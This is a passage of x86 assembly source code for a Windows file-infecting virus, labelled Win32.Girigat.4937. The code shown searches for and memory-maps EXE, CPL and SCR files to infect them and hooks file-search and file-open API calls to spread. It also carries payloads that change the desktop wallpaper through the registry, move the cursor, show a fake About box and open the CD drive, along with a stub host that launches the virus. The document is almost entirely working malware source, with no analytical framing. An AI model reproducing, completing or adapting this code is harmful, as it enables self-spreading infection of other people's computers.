                jmp     update_flag

activ8_flag:    mov     eax,1
update_flag:    mov     byte ptr [edi],al
                inc     edi
                loop    first_phase

                mov     ecx,2
second_phase:   mov     eax,1
                call    pseudorandom

                mov     byte ptr [edi],al
                inc     edi
                loop    second_phase

                cmp     byte ptr [ebp+flag_hooking],OFF
                jne     dir_flags

                mov     byte ptr [ebp+flag_runtime],ON
dir_flags:      cmp     byte ptr [ebp+flag_windir],OFF
                jne     file_flags

                mov     byte ptr [ebp+flag_curdir],ON
file_flags:     cmp     byte ptr [ebp+flag_hit_cpl],OFF
                jne     no_prob_babe

                cmp     byte ptr [ebp+flag_hit_scr],OFF
                jne     no_prob_babe

                mov     byte ptr [ebp+flag_hit_exe],ON
no_prob_babe:   ret

; ÄÄ´ Pseudorandom value generator ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

pseudorandom:   push    ecx edx
                mov     ecx,eax
                call    get_random

                xor     edx,edx
                div     ecx

                mov     eax,edx
                pop     edx ecx
                ret

; ÄÄ´ Random value generator ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_random:     push    ecx edx
                mov     eax,dword ptr [ebp+random_seed]
                mov     ecx,eax
                imul    eax,41c64e6dh
                add     eax,3039h
                mov     dword ptr [ebp+random_seed],eax
                xor     eax,ecx
                pop     edx ecx
                ret

; ÄÄ´ Add wildcard to directory buffer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

add_wildcard:   cld
                lea     edi,dword ptr [ebp+edx+dir_buffer]
                mov     al,'\'
                stosb

copy_string:    lodsb
                stosb
                or      al,al
                jnz     copy_string
                ret

; ÄÄ´ Process current file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

manage_file:    cmp     byte ptr [ebp+flag_hit_cpl],ON
                jne     check_exe

                cmp     eax,'LPC.'
                je      process_file

                cmp     eax,'lpc.'
                je      process_file

check_exe:      cmp     byte ptr [ebp+flag_hit_exe],ON
                jne     check_scr

                cmp     eax,'EXE.'
                je      process_file

                cmp     eax,'exe.'
                je      process_file

check_scr:      cmp     byte ptr [ebp+flag_hit_scr],ON
                jne     just_return

                cmp     eax,'RCS.'
                je      process_file

                cmp     eax,'rcs.'
                jne     just_return

process_file:   push    edx
                call    open_map_file
                or      ebx,ebx
                jz      invalid_file

                call    setup_file
                cmp     eax,0ffffffffh
                je      unmap_n_close

                call    unmap_close
                pop     edx
                add     dword ptr [ebp+win32_finddata+20h],size_in_file
                call    open_map_file

                call    infect_file
                call    unmap_close
                ret

unmap_n_close:  call    unmap_close
invalid_file:   pop     edx
just_return:    ret

; ÄÄ´ Open a file and memory-map it ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

open_map_file:  push    0 80h 3 0 0 0c0000000h edx
                call    dword ptr [ebp+ad_createfile]
                cmp     eax,0ffffffffh
                je      exit_mapping

                mov     dword ptr [ebp+handle_open],eax
                push    0 dword ptr [ebp+win32_finddata+20h]
                push    0 4 0 dword ptr [ebp+handle_open]
                call    dword ptr [ebp+ad_cfmapping]
                or      eax,eax
                jz      close_handle

                mov     dword ptr [ebp+handle_map],eax
                push    dword ptr [ebp+win32_finddata+20h]
                push    0 0 2 dword ptr [ebp+handle_map]
                call    dword ptr [ebp+ad_mapview]
                xchg    ebx,eax
                or      ebx,ebx
                jz      close_mapping
                ret

; ÄÄ´ Unmap a file and close its handle ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

unmap_close:    push    ebx
                call    dword ptr [ebp+ad_unmapview]

close_mapping:  push    dword ptr [ebp+handle_map]
                call    dword ptr [ebp+ad_closehandle]

close_handle:   push    dword ptr [ebp+handle_open]
                call    dword ptr [ebp+ad_closehandle]

exit_mapping:   xor     ebx,ebx
                ret

; ÄÄ´ Get a relative offset ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_relative:   call    lambda_offset
lambda_offset:  pop     ebp
                sub     ebp,offset lambda_offset
                ret

; ÄÄ´ Girigat BMP logo ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

bmp_start       label   byte
                db      42h,4dh,5eh,04h,0,0,0,0,0,0,76h,0,0,0,28h,0,0,0,49h,0,0,0,19h
                db      0,0,0,1,0,4,0,0,0,0,0,0e8h,3,0,0,0c4h,0eh,0,0,0c4h,0eh,0,0,0,0
                db      0,0,0,0,0,0,0ffh,0ffh,0ffh,0,0e1h,0f3h,0ffh,0,0aeh,0dbh,0ffh,0
                db      8dh,0cbh,0feh,0,9ah,0d3h,0fdh,0,70h,0beh,0fah,0,6bh,0bch,0f9h
                db      0,0,99h,0eeh,0,18h,17h,12h,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
                db      0,0,0,0,0,0,0,0,0,0,0,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,90h,0,0,0,99h,22h
                db      22h,99h,99h,99h,99h,99h,92h,22h,99h,99h,22h,22h,99h,99h,99h,99h
                db      99h,22h,29h,99h,99h,99h,99h,33h,39h,99h,99h,99h,22h,29h,33h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,99h,99h,99h,99h,22h,72h
                db      99h,99h,27h,72h,99h,99h,99h,99h,92h,27h,29h,99h,99h,99h,93h,37h
                db      39h,99h,99h,92h,77h,73h,37h,39h,99h,99h,90h,0,0,0,99h,27h
                db      72h,99h,99h,99h,99h,99h,27h,72h,99h,99h,27h,72h,99h,99h,99h,99h
                db      22h,77h,29h,99h,99h,99h,93h,77h,39h,99h,99h,27h,77h,23h,77h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,99h,22h,22h,99h,27h,72h
                db      99h,99h,27h,72h,99h,99h,99h,92h,27h,72h,99h,93h,33h,39h,93h,77h
                db      39h,99h,93h,77h,22h,83h,77h,39h,99h,99h,90h,0,0,0,99h,27h
                db      72h,99h,92h,27h,72h,99h,27h,72h,99h,99h,27h,72h,99h,99h,99h,22h
                db      77h,29h,99h,33h,77h,39h,93h,77h,39h,99h,37h,73h,28h,83h,77h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,22h,77h,72h,99h,27h,72h
                db      99h,99h,27h,72h,99h,99h,93h,37h,72h,99h,93h,37h,77h,39h,93h,77h
                db      39h,99h,37h,73h,88h,83h,77h,39h,99h,99h,90h,0,0,0,99h,27h
                db      72h,99h,27h,77h,72h,99h,27h,72h,99h,99h,27h,72h,99h,99h,33h,77h
                db      33h,99h,93h,77h,77h,39h,93h,77h,39h,99h,37h,73h,88h,83h,77h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,27h,77h,72h,99h,27h,72h
                db      99h,99h,27h,72h,99h,99h,37h,77h,73h,99h,93h,77h,77h,39h,93h,77h
                db      39h,99h,37h,73h,38h,83h,77h,39h,99h,99h,90h,0,0,0,99h,27h
                db      72h,99h,27h,27h,72h,99h,27h,72h,99h,99h,27h,72h,99h,93h,37h,77h
                db      73h,99h,93h,73h,77h,39h,93h,77h,39h,99h,37h,77h,33h,33h,77h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,22h,27h,72h,99h,27h,72h
                db      99h,99h,27h,72h,99h,93h,77h,77h,73h,39h,93h,33h,77h,39h,93h,77h
                db      39h,99h,37h,77h,77h,77h,77h,39h,99h,99h,90h,0,0,0,99h,27h
                db      72h,99h,99h,27h,72h,99h,27h,72h,99h,99h,27h,72h,99h,93h,73h,37h
                db      77h,39h,99h,93h,77h,39h,93h,77h,39h,99h,93h,77h,77h,77h,77h,39h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,99h,27h,72h,99h,27h,72h
                db      99h,99h,27h,72h,99h,99h,99h,37h,77h,39h,99h,93h,77h,39h,93h,77h
                db      39h,99h,99h,99h,99h,93h,77h,39h,99h,99h,90h,0,0,0,92h,27h
                db      72h,22h,22h,27h,72h,22h,27h,72h,24h,41h,27h,75h,33h,33h,33h,37h
                db      77h,33h,33h,33h,77h,33h,33h,77h,33h,33h,33h,33h,33h,33h,77h,33h
                db      33h,33h,30h,0,0,0,22h,77h,77h,77h,77h,77h,77h,77h,77h,77h
                db      77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h
                db      77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,30h,0,0,0,27h,77h
                db      77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h
                db      77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h,77h
                db      77h,33h,30h,0,0,0,22h,27h,72h,22h,22h,22h,22h,22h,22h,22h
                db      22h,26h,37h,73h,33h,33h,33h,33h,33h,33h,33h,33h,33h,33h,33h,33h
                db      33h,33h,33h,33h,33h,33h,33h,33h,33h,39h,90h,0,0,0,99h,27h
                db      72h,99h,99h,99h,99h,99h,99h,99h,99h,99h,37h,73h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,90h,0,0,0,99h,27h,72h,99h,99h,97h,72h,99h,99h,99h
                db      99h,99h,37h,73h,99h,99h,97h,73h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,90h,0,0,0,99h,27h
                db      77h,22h,77h,77h,22h,99h,99h,99h,99h,99h,37h,77h,33h,77h,77h,33h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,90h,0,0,0,99h,27h,77h,77h,77h,72h,29h,99h,99h,99h
                db      99h,99h,37h,77h,77h,77h,73h,39h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,90h,0,0,0,99h,22h
                db      77h,72h,22h,22h,99h,99h,99h,99h,99h,99h,33h,77h,73h,33h,33h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,90h,0,0,0,99h,92h,22h,22h,99h,99h,99h,99h,99h,99h
                db      99h,99h,93h,33h,33h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,90h,0,0,0,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,90h,0,0,0,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,99h
                db      99h,99h,99h,99h,99h,99h,99h,99h,99h,99h,90h,0,0,0
bmp_end         label   byte

; ÍÍ¹ Data area ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; ÄÄ´ Internal data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ON              equ     1
OFF             equ     0
rgb_value       db      0
element_no      db      1
buffer_size     dd      102h

base_default    equ     400000h
bmp_length      equ     bmp_end-bmp_start
size_in_file    equ     file_end-global_start

key_dd_wpaper   db      '0',0
key_dd_color    db      '0 0 0',0

flags_start     label   byte
flag_curdir     db      ON
flag_windir     db      OFF
flag_hooking    db      ON
flag_runtime    db      ON
flag_hit_exe    db      ON
flag_hit_cpl    db      OFF
flag_hit_scr    db      OFF
flags_end       label   byte

birth_month     dw      ?
birth_day       dw      ?

@sz_apis_start  label   byte
                dd      offset sz_gcompname
                dd      offset sz_lstrcpy
                dd      offset sz_getsystime
                dd      offset sz_loadlibrary
                dd      offset sz_writefile
                dd      offset sz_getcurdir
                dd      offset sz_getwindir
                dd      offset sz_getsysdir
                dd      offset sz_findfirst
                dd      offset sz_findnext
                dd      offset sz_findclose
                dd      offset sz_createfile
                dd      offset sz_cfmapping
                dd      offset sz_mapview
                dd      offset sz_unmapview
                dd      offset sz_closehandle
                dd      offset sz_wide2multi
@sz_apis_end    label   byte

@payloads_start label   byte
                dd      offset new_wallpaper
                dd      offset crazy_cursor
                dd      offset virus_about
                dd      offset poltergeist
@payloads_end   label   byte

dd_hook_start   label   byte
dd_@crtfile_a   dd      sz_@crtfile_w-sz_@crtfile_a
ad_@crtfile_a   dd      ?
@ad_crtfile_a   dd      offset @createfile
dd_@crtfile_w   dd      sz_@findfst_a-sz_@crtfile_w
ad_@crtfile_w   dd      ?
@ad_crtfile_w   dd      offset @@createfile
dd_@findfst_a   dd      sz_@findfst_w-sz_@findfst_a
ad_@findfst_a   dd      ?
@ad_findfst_a   dd      offset @findfirst
dd_@findfst_w   dd      sz_@findnext_a-sz_@findfst_w
ad_@findfst_w   dd      ?
@ad_findfst_w   dd      offset @@findfirst
dd_@findnext_a  dd      sz_@findnext_w-sz_@findnext_a
ad_@findnext_a  dd      ?
@ad_findnext_a  dd      offset @findnext
dd_@findnext_w  dd      sz_hook_end-sz_@findnext_w
ad_@findnext_w  dd      ?
@ad_findnext_w  dd      offset @@findnext
dd_hook_end     dd      0

sz_kernel32     db      'KERNEL32.dll',0
sz_user32       db      'USER32.dll',0
sz_advapi32     db      'ADVAPI32.dll',0
sz_winmm        db      'WINMM.dll',0
sz_shell32      db      'SHELL32.dll',0
sz_gmhandlea    db      'GetModuleHandleA',0
sz_gmhandlew    db      'GetModuleHandleW',0
sz_gpaddress    db      'GetProcAddress',0

sz_apis_start   label   byte
sz_gcompname    db      'GetComputerNameA',0
sz_lstrcpy      db      'lstrcpyA',0
sz_getsystime   db      'GetSystemTime',0
sz_loadlibrary  db      'LoadLibraryA',0
sz_writefile    db      'WriteFile',0
sz_getcurdir    db      'GetCurrentDirectoryA',0
sz_getwindir    db      'GetWindowsDirectoryA',0
sz_getsysdir    db      'GetSystemDirectoryA',0
sz_findfirst    db      'FindFirstFileA',0
sz_findnext     db      'FindNextFileA',0
sz_findclose    db      'FindClose',0
sz_createfile   db      'CreateFileA',0
sz_cfmapping    db      'CreateFileMappingA',0
sz_mapview      db      'MapViewOfFile',0
sz_unmapview    db      'UnmapViewOfFile',0
sz_closehandle  db      'CloseHandle',0
sz_wide2multi   db      'WideCharToMultiByte',0
sz_apis_end     label   byte

sz_xapis_start  label   byte
sz_setcurpos    db      'SetCursorPos',0
sz_loadicon     db      'LoadIconA',0
sz_shellabout   db      'ShellAboutA',0
sz_mcisendstr   db      'mciSendStringA',0
sz_regopenkey   db      'RegOpenKeyExA',0
sz_regsetvalue  db      'RegSetValueExA',0
sz_xapis_end    label   byte

sz_hook_start   label   byte
sz_@crtfile_a   db      'CreateFileA',0
sz_@crtfile_w   db      'CreateFileW',0
sz_@findfst_a   db      'FindFirstFileA',0
sz_@findfst_w   db      'FindFirstFileW',0
sz_@findnext_a  db      'FindNextFileA',0
sz_@findnext_w  db      'FindNextFileW',0
sz_hook_end     label   byte

about_title     db      'System Info#+ Girigat.4937',0
virus_creds     db      '(C) 1998-1999 Mister Sandman',0

key_sz_wpaper   db      'Wallpaper',0
key_sz_tilewp   db      'TileWallpaper',0
key_sz_wpstyle  db      'WallpaperStyle',0
key_sz_bgcolor  db      'Background',0
key_sz_desktop  db      'Control Panel\Desktop',0
key_sz_colors   db      'Control Panel\Colors',0

sz_wildcard     db      '*.*',0
sz_bmp_file     db      'c:\Girigat.bmp',0
sz_open_cd      db      'set cdaudio door open',0
sz_close_cd     db      'set cdaudio door closed',0
sz_comp_name    db      0ah dup (?)
random_seed     dd      0bebafecah
file_end        label   byte

; ÄÄ´ External data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ad_kernel32     dd      ?
ad_gmhandlea    dd      ?
ad_gmhandlew    dd      ?
ad_gpaddress    dd      ?

ad_apis_start   label   byte
ad_gcompname    dd      ?
ad_lstrcpy      dd      ?
ad_getsystime   dd      ?
ad_loadlibrary  dd      ?
ad_writefile    dd      ?
ad_getcurdir    dd      ?
ad_getwindir    dd      ?
ad_getsysdir    dd      ?
ad_findfirst    dd      ?
ad_findnext     dd      ?
ad_findclose    dd      ?
ad_createfile   dd      ?
ad_cfmapping    dd      ?
ad_mapview      dd      ?
ad_unmapview    dd      ?
ad_closehandle  dd      ?
ad_wide2multi   dd      ?
ad_apis_end     label   byte

ad_xapis_start  label   byte
ad_setcurpos    dd      ?
ad_loadicon     dd      ?
ad_shellabout   dd      ?
ad_mcisendstr   dd      ?
ad_regopenkey   dd      ?
ad_regsetvalue  dd      ?
ad_xapis_end    label   byte

current_time    label   byte
current_year    dw      ?
current_month   dw      ?
current_dow     dw      ?
current_day     dw      ?
current_hour    dw      ?
current_minute  dw      ?
current_secs    dw      ?
current_msecs   dw      ?

handle_key      dd      ?
handle_search   dd      ?
handle_open     dd      ?
handle_map      dd      ?

@functions      dd      ?
@names          dd      ?
@ordinals       dd      ?
imp_tbl_desc    dd      ?
victim_base     dd      ?
pe_alignment    dd      ?
byte_counter    dd      ?
unicode_api     db      OFF

dir_buffer      db      104h dup (?)
win32_finddata  db      13eh dup (?)
ff_file_path    db      104h dup (?)
temp_buffer     db      104h dup (?)

; ÍÍ¹ Fake host code ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

host_entry:     push    offset sz_kernel32
                call    GetModuleHandleA
                or      eax,eax
                jz      host_code
                mov     dword ptr [ad_kernel32],eax
                jmp     file_entry

host_code:      push    10h offset box_title
                push    offset box_text 0
                call    MessageBoxA

                push    0
                call    ExitProcess

                .data
box_title       db      'Virus Alert!',0
box_text        db      'Win32.Girigat is now active!    ',0
                end     host_entry
